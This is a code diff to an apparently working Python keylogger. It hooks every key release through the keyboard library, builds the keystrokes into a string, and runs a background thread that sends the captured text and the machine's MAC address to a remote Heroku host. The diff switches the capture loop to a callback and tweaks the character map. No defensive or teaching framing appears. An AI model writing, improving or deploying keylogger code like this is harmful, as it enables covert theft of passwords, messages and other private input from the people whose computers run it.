@@ -6,6 +6,7 @@ import threading
 import keyboard
 import requests
 import time
+import sys
 
 from uuid import getnode as get_mac
 
@@ -14,10 +15,10 @@ CHARMAP = {
     "shift" : "",
     "right shift" : "",
     "enter" : "\n",
-    "backspace" : "\u0008",
+    "backspace" : "\\u0008",
     "space" : " ",
     "ctrl": " ctrl-",
-    "tab": ""
+    "tab":  "   "
     }
 URL = "http://py3keylogger.herokuapp.com" # "http://127.0.0.1:5000"#
 START_TIME = time.time()
@@ -67,31 +68,30 @@ def sendinfo():
             print("Error:", e)
             time.sleep(5)
 
-def main():
+def main(event):
     global CONDITION, typed_string
     #This is the main loop which handles the reading part of key-strokes
-    while True:
+    
         # Reading the key-strokes
-        key = keyboard.read_key()
-        if key == "esc":
-            print("Ended")
-            CONDITION = False
-            break
-        try:
-            # Comparing it with predefined sets of key-strokes
-            pressed = CHARMAP[key]
-            # Storing the data in memory
-            typed_string = typed_string + pressed
+    key = event.name
+    if key == "esc":
+        print("Ended")
+    try:
+        # Comparing it with predefined sets of key-strokes
+        pressed = CHARMAP[key]
+        # Storing the data in memory
+        typed_string = typed_string + pressed
+        
+    except:
+        typed_string = typed_string + key
             
-        except:
-            typed_string = typed_string + key
-            
-        # Sleeping minutely to reduce load on machine
-        time.sleep(0.15)
 
 # Starting the event thread
 thread = threading.Thread(target=sendinfo)
 thread.start()
 
 # Starting the mainloop
-main()
+
+keyboard.on_release(callback=main)
+keyboard.wait("esc")
+CONDITION = False
